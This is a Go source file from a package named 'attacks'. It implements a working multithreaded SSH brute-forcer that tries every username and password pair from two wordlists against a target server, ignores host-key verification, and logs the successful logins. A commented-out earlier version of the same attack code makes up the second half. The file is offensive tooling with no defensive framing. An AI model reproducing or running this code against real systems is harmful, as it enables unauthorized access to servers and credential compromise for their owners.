package attacks

import (
	"fmt"
	"log"
	"net"

	"golang.org/x/crypto/ssh"
)

//workSSH goroutine for one attack of SSH
func workSSH(job login, serverIP, serverPort string) {
	fmt.Println(yellow("[attemp] ", job.pos, " ", job.user, ":", job.pass))
	defer wg.Done()

	//SSH basic connection
	config := &ssh.ClientConfig{
		User: job.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(job.pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	//Recover function
	defer func() {
		r := recover()
		if r != nil {
			fmt.Println(r)
		}
	}()

	t := net.JoinHostPort(serverIP, serverPort)

	_, err := ssh.Dial("tcp", t, config)

	if err != nil {
		log.Println(red("[X] Failed to connect ", job.pos, " at ", t, " ", job.user, ":", job.pass))
	} else {
		log.Println(green("[+][+] Session Connect ", job.pos, " at ", t, " ", job.user, ":", job.pass))
	}
}

//SSHattackStart SSH attack with 2 files to iterate
func SSHattackStart(userFile, passFile string, serverIP, serverPort string, nWorkers int) {
	if nWorkers == 0 {
		nWorkers = 9
	}
	log.Println("[0] Starting jobs")
	log.Println(userFile, passFile, serverIP, serverPort, nWorkers)

	outchan := make(chan login, nWorkers)
	go Read2Files(userFile, passFile, outchan)
	var sem = make(chan int, nWorkers)
	for i := 0; i < nWorkers; i++ {
		sem <- 1
	}
	for {
		select {
		case job, ok := <-outchan:
			if !ok {
				wg.Wait()
				fmt.Println(yellow("[info] jobs finisished"))
				return
			}
			wg.Add(1)
			<-sem
			go func(job login) {
				workSSH(job, serverIP, serverPort)
				sem <- 1
			}(job)
		}
	}
}

// type readerChan struct {
// 	user string
// 	pass string
// 	pos  string
// }

// func ssh_test(job readerChan, serverIP, serverPort string) {

// 	config := &ssh.ClientConfig{
// 		User: job.user,
// 		Auth: []ssh.AuthMethod{
// 			ssh.Password(job.pass),
// 		},
// 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
// 	}

// 	//Recover function
// 	defer func() {
// 		r := recover()
// 		if r != nil {
// 			fmt.Println(r)
// 		}
// 	}()

// 	t := net.JoinHostPort(serverIP, serverPort)

// 	_, err := ssh.Dial("tcp", t, config)

// 	if err != nil {
// 		log.Println(red("[X] Failed to connect to ", t, " ", job.user, ":", job.pass, " ", job.pos))
// 	} else {
// 		log.Println(green("[+][+] Session Connect at ", t, " ", job.user, ":", job.pass, " ", job.pos))
// 	}
// }

// func work(job readerChan, serverIP, serverPort string) {
// 	fmt.Println(yellow("[attemp] ", job))
// 	defer wg.Done()
// 	ssh_test(job, serverIP, serverPort)
// }

// func read_files(user_file, pass_file string, rchan chan readerChan) {

// 	f1, err := os.Open(user_file)
// 	check(err)
// 	f2, err := os.Open(pass_file)
// 	check(err)

// 	defer func() {
// 		f1.Close()
// 		f2.Close()
// 		close(rchan)
// 	}()

// 	ureader := bufio.NewScanner(f1)
// 	preader := bufio.NewScanner(f2)

// 	var userList []string
// 	for i := 0; preader.Scan(); i++ {
// 		if i == 0 {
// 			for j := 0; ureader.Scan(); j++ {
// 				userList = append(userList, ureader.Text())
// 				// fmt.Println("[+]",j,i,userList[len(userList)-1],preader.Text())
// 				rchan <- readerChan{user: userList[len(userList)-1], pass: preader.Text(), pos: strconv.Itoa(i) + "-" + strconv.Itoa(j)}
// 			}

// 			if err := ureader.Err(); err != nil {
// 				check(err)
// 			}
// 		} else {
// 			for j, u := range userList {
// 				rchan <- readerChan{user: u, pass: preader.Text(), pos: strconv.Itoa(i) + "-" + strconv.Itoa(j)}
// 			}
// 		}
// 	}
// 	if err := preader.Err(); err != nil {
// 		check(err)
// 	}

// }

// func Ssh_bruteforce_start(userFile, passFile string, serverIP, serverPort string, n_workers int) {

// 	// runtime.GOMAXPROCS(4)
// 	if n_workers == 0 {
// 		n_workers = 9
// 	}
// 	log.Println("[0] Starting jobs")
// 	log.Println(userFile, passFile, serverIP, serverPort, n_workers)

// 	rchan := make(chan readerChan, n_workers)
// 	go read_files(userFile, passFile, rchan)
// 	var sem = make(chan int, n_workers)
// 	for i := 0; i < n_workers; i++ {
// 		sem <- 1
// 	}
// 	for {
// 		select {
// 		case job, ok := <-rchan:
// 			if !ok {
// 				wg.Wait()
// 				fmt.Println("[info] Jobs Finished")
// 				return
// 			}
// 			wg.Add(1)
// 			<-sem
// 			go func(job readerChan) {
// 				work(job, serverIP, serverPort)
// 				sem <- 1
// 			}(job)
// 		}
// 	}
// }
